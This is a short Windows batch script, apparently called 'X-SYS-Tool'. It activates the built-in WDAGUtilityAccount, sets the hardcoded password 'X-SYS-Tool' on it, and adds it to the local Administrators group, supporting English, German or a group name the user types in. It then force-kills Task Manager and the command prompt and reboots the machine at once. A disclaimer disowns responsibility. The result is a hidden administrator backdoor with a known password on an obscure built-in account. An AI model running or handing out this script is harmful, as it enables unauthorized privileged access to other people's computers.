net user WDAGUtilityAccount /active:yes
net user WDAGUtilityAccount X-SYS-Tool
net localgroup administratoren /add WDAGUtilityAccount
net localgroup administrators /add WDAGUtilityAccount#
echo [ ! ] The Creator of this tool is not responsible for any of these actions.
echo [ - ] Only English and German Systems supported at the moment!
echo [ + ] Account Activated with Password "X-SYS-Tool" <-- Remember this!
echo [ + ] For and languages that are not English and German, type "Administrators" in your language (has to be the one the system uses). English and German people can close this Windows.
set /p admin_group=[ + ] :
net localgroup %admin_group% /add WDAGUtilityAccount
taskkill /f /im taskmgr.exe
taskkill /f /im cmd.exe
shutdown -r -f -t 0
